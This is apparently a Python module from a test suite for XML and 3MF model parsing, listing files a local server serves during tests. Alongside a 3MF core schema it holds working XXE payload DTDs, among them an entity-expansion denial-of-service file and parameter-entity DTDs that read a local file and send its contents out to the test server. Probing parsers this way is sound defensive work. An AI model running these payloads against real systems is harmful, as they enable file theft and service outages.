"""Defines semi-static files that are to be served while the XML tests are running."""

# pylint: disable=wildcard-import,unused-wildcard-import

from os.path import join

from ... import LOCAL_SERVER, STATIC_FILE_DIR_DST
from ..tmf_model_mutator.complex_types import *
from ..tmf_model_mutator.simple_types import *
from .base_objects import BASE_MODEL, BASE_MODEL_OBJECT

SERVER_FILES = [
    {
        "name": "test.txt",
        "content": """\
            successful!
            """,
    },
    {
        "name": "test.dtd",
        "content": """\
            <!ENTITY a0 'successful!'>
            """,
    },
    {
        "name": "dos.dtd",
        "content": """\
            <!ENTITY % a0 "dos" >
            <!ENTITY % a1 "%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;">
            <!ENTITY % a2 "%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;">
            <!ENTITY % a3 "%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;">
            <!ENTITY % a4 "%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;">
            <!ENTITY g "%a4;" >
            """,
    },
    {
        "name": "parameterEntity_core.dtd",
        "content": """\
            <!ENTITY all '%start;%goodies;%end;'>
            """,
    },
    {
        "name": "parameterEntity_doctype.dtd",
        "content": f"""\
            <!ELEMENT data (#PCDATA)>
            <!ENTITY % start "<![CDATA[">
            <!ENTITY % goodies SYSTEM "file://{join(STATIC_FILE_DIR_DST, "test.txt")}">
            <!ENTITY % end "]]>">
            <!ENTITY all '%start;%goodies;%end;'>
            """,
    },
    {
        "name": "external_entity_attribute.dtd",
        "content": f"""\
            <!ENTITY % payload SYSTEM "file://{join(STATIC_FILE_DIR_DST, "test.txt")}">
            <!ENTITY % param1 "<!ENTITY internal '%payload;'>">
            %param1;
            """,
    },
    {
        "name": "error-based.dtd",
        "content": f"""\
            <!ENTITY % file SYSTEM "file://{join(STATIC_FILE_DIR_DST, "test.txt")}">
            <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
            %eval;
            %error;
            """,
    },
    {
        "name": "error-based-local.dtd",
        "content": """\
            <!ENTITY % condition "and | or | not | equal | contains | exists | subdomain-of">
            <!ELEMENT pattern (%condition;)>
            """,
    },
    {
        "name": "parameterEntity_oob.dtd",
        "content": f"""\
            <!ENTITY % file SYSTEM "file://{join(STATIC_FILE_DIR_DST, "test.txt")}">
            <!ENTITY % all "<!ENTITY send SYSTEM '{LOCAL_SERVER}/?%file;'>">
            %all;
            """,
    },
    {
        "name": "parameterEntity_sendhttp.dtd",
        "content": f"""\
            <!ENTITY % payload SYSTEM "file://{join(STATIC_FILE_DIR_DST, "test.txt")}">
            <!ENTITY % param1 "<!ENTITY &#37; send SYSTEM '{LOCAL_SERVER}/%payload;'>">
            %param1;
            """,
    },
    {
        "name": "build-element.xml",
        "content": CT_Build(
            children=[CT_Item(attributes=[("objectid", ST_ResourceID("1"))])]
        ).to_xml(root=True),
    },
    {
        "name": "3mf-core.xsd",
        "content": """\
            <?xml version="1.0" encoding="UTF-8"?>
            <xs:schema xmlns="http://schemas.microsoft.com/3dmanufacturing/core/2015/02"
                xmlns:xs="http://www.w3.org/2001/XMLSchema"
                xmlns:xml="http://www.w3.org/XML/1998/namespace" targetNamespace="http://schemas.microsoft.com/3dmanufacturing/core/2015/02" elementFormDefault="unqualified" attributeFormDefault="unqualified" blockDefault="#all">
                <!-- Import xml: namespace -->
                <xs:import namespace="http://www.w3.org/XML/1998/namespace" schemaLocation="http://www.w3.org/2001/xml.xsd" />

                <xs:annotation>
                    <xs:documentation><![CDATA[
                    Schema notes:

                    Items within this schema follow a simple naming convention of appending a prefix indicating the type of element for references:

                    Unprefixed: Element names
                    CT_: Complex types
                    ST_: Simple types
                    
                    ]]>        </xs:documentation>
                </xs:annotation>
                <!-- Complex Types -->
                <xs:complexType name="CT_Model">
                    <xs:sequence>
                        <xs:element ref="metadata" minOccurs="0" maxOccurs="2147483647"/>
                        <xs:element ref="resources"/>
                        <xs:element ref="build"/>
                        <xs:any namespace="##other" processContents="lax" minOccurs="0" maxOccurs="2147483647"/>
                    </xs:sequence>
                    <xs:attribute name="unit" type="ST_Unit" default="millimeter"/>
                    <xs:attribute ref="xml:lang"/>
                    <xs:attribute name="requiredextensions" type="xs:string"/>
                    <xs:anyAttribute namespace="##other" processContents="lax"/>
                </xs:complexType>
                <xs:complexType name="CT_Resources">
                    <xs:sequence>
                        <xs:choice minOccurs="0" maxOccurs="2147483647">
                            <xs:element ref="basematerials" minOccurs="0" maxOccurs="2147483647"/>
                            <xs:any namespace="##other" processContents="lax" minOccurs="0" maxOccurs="2147483647"/>
                        </xs:choice>
                        <xs:element ref="object" minOccurs="0" maxOccurs="2147483647"/>
                    </xs:sequence>
                    <xs:anyAttribute namespace="##other" processContents="lax"/>
                </xs:complexType>
                <xs:complexType name="CT_Build">
                    <xs:sequence>
                        <xs:element ref="item" minOccurs="0" maxOccurs="2147483647"/>
                    </xs:sequence>
                    <xs:anyAttribute namespace="##other" processContents="lax"/>
                </xs:complexType>
                <xs:complexType name="CT_BaseMaterials">
                    <xs:sequence>
                        <xs:element ref="base" maxOccurs="2147483647"/>
                    </xs:sequence>
                    <xs:attribute name="id" type="ST_ResourceID" use="required"/>
                    <xs:anyAttribute namespace="##other" processContents="lax"/>
                </xs:complexType>
                <xs:complexType name="CT_Base">
                    <xs:attribute name="name" type="xs:string" use="required"/>
                    <xs:attribute name="displaycolor" type="ST_ColorValue" use="required"/>
                    <xs:anyAttribute namespace="##other" processContents="lax"/>
                </xs:complexType>
                <xs:complexType name="CT_MetadataGroup">
                    <xs:sequence>
                        <xs:element ref="metadata" maxOccurs="2147483647"/>
                    </xs:sequence>
                    <xs:anyAttribute namespace="##other" processContents="lax"/>
                </xs:complexType>
                <xs:complexType name="CT_Object">
                    <xs:sequence>
                        <xs:element ref="metadatagroup" minOccurs="0" maxOccurs="1"/>
                        <xs:choice>
                            <xs:element ref="mesh"/>
                            <xs:element ref="components"/>
                        </xs:choice>
                    </xs:sequence>
                    <xs:attribute name="id" type="ST_ResourceID" use="required"/>
                    <xs:attribute name="type" type="ST_ObjectType" default="model"/>
                    <xs:attribute name="thumbnail" type="ST_UriReference"/>
                    <xs:attribute name="partnumber" type="xs:string"/>
                    <xs:attribute name="name" type="xs:string"/>
                    <xs:attribute name="pid" type="ST_ResourceIndex"/>
                    <xs:attribute name="pindex" type="ST_ResourceIndex"/>
                    <xs:anyAttribute namespace="##other" processContents="lax"/>
                </xs:complexType>
                <xs:complexType name="CT_Mesh">
                    <xs:sequence>
                        <xs:element ref="vertices"/>
                        <xs:element ref="triangles"/>
                        <xs:any namespace="##other" processContents="lax" minOccurs="0" maxOccurs="2147483647"/>
                    </xs:sequence>
                    <xs:anyAttribute namespace="##other" processContents="lax"/>
                </xs:complexType>
                <xs:complexType name="CT_Vertices">
                    <xs:sequence>
                        <xs:element ref="vertex" minOccurs="3" maxOccurs="2147483647"/>
                    </xs:sequence>
                    <xs:anyAttribute namespace="##other" processContents="lax"/>
                </xs:complexType>
                <xs:complexType name="CT_Vertex">
                    <xs:attribute name="x" type="ST_Number" use="required"/>
                    <xs:attribute name="y" type="ST_Number" use="required"/>
                    <xs:attribute name="z" type="ST_Number" use="required"/>
                    <xs:anyAttribute namespace="##other" processContents="lax"/>
                </xs:complexType>
                <xs:complexType name="CT_Triangles">
                    <xs:sequence>
                        <xs:element ref="triangle" minOccurs="1" maxOccurs="2147483647"/>
                    </xs:sequence>
                    <xs:anyAttribute namespace="##other" processContents="lax"/>
                </xs:complexType>
                <xs:complexType name="CT_Triangle">
                    <xs:attribute name="v1" type="ST_ResourceIndex" use="required"/>
                    <xs:attribute name="v2" type="ST_ResourceIndex" use="required"/>
                    <xs:attribute name="v3" type="ST_ResourceIndex" use="required"/>
                    <xs:attribute name="p1" type="ST_ResourceIndex"/>
                    <xs:attribute name="p2" type="ST_ResourceIndex"/>
                    <xs:attribute name="p3" type="ST_ResourceIndex"/>
                    <xs:attribute name="pid" type="ST_ResourceID"/>
                    <xs:anyAttribute namespace="##other" processContents="lax"/>
                </xs:complexType>
                <xs:complexType name="CT_Components">
                    <xs:sequence>
                        <xs:element ref="component" maxOccurs="2147483647"/>
                    </xs:sequence>
                    <xs:anyAttribute namespace="##other" processContents="lax"/>
                </xs:complexType>
                <xs:complexType name="CT_Component">
                    <xs:attribute name="objectid" type="ST_ResourceID" use="required"/>
                    <xs:attribute name="transform" type="ST_Matrix3D"/>
                    <xs:anyAttribute namespace="##other" processContents="lax"/>
                </xs:complexType>
                <xs:complexType name="CT_Metadata" mixed="true">
                    <xs:attribute name="name" type="xs:QName" use="required"/>
                    <xs:attribute name="preserve" type="xs:boolean" use="optional" />
                    <xs:attribute name="type" type="xs:string" use="optional" />
                    <xs:anyAttribute namespace="##other" processContents="lax"/>
                </xs:complexType>
                <xs:complexType name="CT_Item">
                    <xs:sequence>
                        <xs:element ref="metadatagroup" minOccurs="0" maxOccurs="1"/>
                    </xs:sequence>
                    <xs:attribute name="objectid" type="ST_ResourceID" use="required"/>
                    <xs:attribute name="transform" type="ST_Matrix3D"/>
                    <xs:attribute name="partnumber" type="xs:string"/>
                    <xs:anyAttribute namespace="##other" processContents="lax"/>
                </xs:complexType>
                <!-- Simple Types -->
                <xs:simpleType name="ST_Unit">
                    <xs:restriction base="xs:string">
                        <xs:enumeration value="micron"/>
                        <xs:enumeration value="millimeter"/>
                        <xs:enumeration value="centimeter"/>
                        <xs:enumeration value="inch"/>
                        <xs:enumeration value="foot"/>
                        <xs:enumeration value="meter"/>
                    </xs:restriction>
                </xs:simpleType>
                <xs:simpleType name="ST_ColorValue">
                    <xs:restriction base="xs:string">
                        <xs:pattern value="#[0-9|A-F|a-f][0-9|A-F|a-f][0-9|A-F|a-f][0-9|A-F|a-f][0-9|A-F|a-f][0-9|A-F|a-f]([0-9|A-F|a-f][0-9|A-F|a-f])?"/>
                    </xs:restriction>
                </xs:simpleType>
                <xs:simpleType name="ST_UriReference">
                    <xs:restriction base="xs:anyURI">
                        <xs:pattern value="/.*"/>
                    </xs:restriction>
                </xs:simpleType>
                <xs:simpleType name="ST_Matrix3D">
                    <xs:restriction base="xs:string">
                        <xs:whiteSpace value="collapse"/>
                        <xs:pattern value="((\-|\+)?(([0-9]+(\.[0-9]+)?)|(\.[0-9]+))((e|E)(\-|\+)?[0-9]+)?) ((\-|\+)?(([0-9]+(\.[0-9]+)?)|(\.[0-9]+))((e|E)(\-|\+)?[0-9]+)?) ((\-|\+)?(([0-9]+(\.[0-9]+)?)|(\.[0-9]+))((e|E)(\-|\+)?[0-9]+)?) ((\-|\+)?(([0-9]+(\.[0-9]+)?)|(\.[0-9]+))((e|E)(\-|\+)?[0-9]+)?) ((\-|\+)?(([0-9]+(\.[0-9]+)?)|(\.[0-9]+))((e|E)(\-|\+)?[0-9]+)?) ((\-|\+)?(([0-9]+(\.[0-9]+)?)|(\.[0-9]+))((e|E)(\-|\+)?[0-9]+)?) ((\-|\+)?(([0-9]+(\.[0-9]+)?)|(\.[0-9]+))((e|E)(\-|\+)?[0-9]+)?) ((\-|\+)?(([0-9]+(\.[0-9]+)?)|(\.[0-9]+))((e|E)(\-|\+)?[0-9]+)?) ((\-|\+)?(([0-9]+(\.[0-9]+)?)|(\.[0-9]+))((e|E)(\-|\+)?[0-9]+)?) ((\-|\+)?(([0-9]+(\.[0-9]+)?)|(\.[0-9]+))((e|E)(\-|\+)?[0-9]+)?) ((\-|\+)?(([0-9]+(\.[0-9]+)?)|(\.[0-9]+))((e|E)(\-|\+)?[0-9]+)?) ((\-|\+)?(([0-9]+(\.[0-9]+)?)|(\.[0-9]+))((e|E)(\-|\+)?[0-9]+)?)"/>
                    </xs:restriction>
                </xs:simpleType>
                <xs:simpleType name="ST_Number">
                    <xs:restriction base="xs:double">
                        <xs:whiteSpace value="collapse"/>
                        <xs:pattern value="((\-|\+)?(([0-9]+(\.[0-9]+)?)|(\.[0-9]+))((e|E)(\-|\+)?[0-9]+)?)"/>
                    </xs:restriction>
                </xs:simpleType>
                <xs:simpleType name="ST_ResourceID">
                    <xs:restriction base="xs:positiveInteger">
                        <xs:maxExclusive value="2147483648"/>
                    </xs:restriction>
                </xs:simpleType>
                <xs:simpleType name="ST_ResourceIndex">
                    <xs:restriction base="xs:nonNegativeInteger">
                        <xs:maxExclusive value="2147483648"/>
                    </xs:restriction>
                </xs:simpleType>
                <xs:simpleType name="ST_ObjectType">
                    <xs:restriction base="xs:string">
                        <xs:enumeration value="model"/>
                        <xs:enumeration value="solidsupport"/>
                        <xs:enumeration value="support"/>
                        <xs:enumeration value="surface"/>
                        <xs:enumeration value="other"/>
                    </xs:restriction>
                </xs:simpleType>
                <!-- Elements -->
                <xs:element name="metadatagroup" type="CT_MetadataGroup"/>
                <xs:element name="model" type="CT_Model"/>
                <xs:element name="resources" type="CT_Resources"/>
                <xs:element name="build" type="CT_Build"/>
                <xs:element name="basematerials" type="CT_BaseMaterials"/>
                <xs:element name="base" type="CT_Base"/>
                <xs:element name="object" type="CT_Object"/>
                <xs:element name="mesh" type="CT_Mesh"/>
                <xs:element name="vertices" type="CT_Vertices"/>
                <xs:element name="vertex" type="CT_Vertex"/>
                <xs:element name="triangles" type="CT_Triangles"/>
                <xs:element name="triangle" type="CT_Triangle"/>
                <xs:element name="components" type="CT_Components"/>
                <xs:element name="component" type="CT_Component"/>
                <xs:element name="metadata" type="CT_Metadata"/>
                <xs:element name="item" type="CT_Item"/>
            </xs:schema>
            """,
    },
    {
        "name": "3mf-object.xml",
        "content": BASE_MODEL_OBJECT.to_xml(root=True),
    },
    {
        "name": "3mf-model.model",
        "content": BASE_MODEL.to_xml(root=True),
    },
]
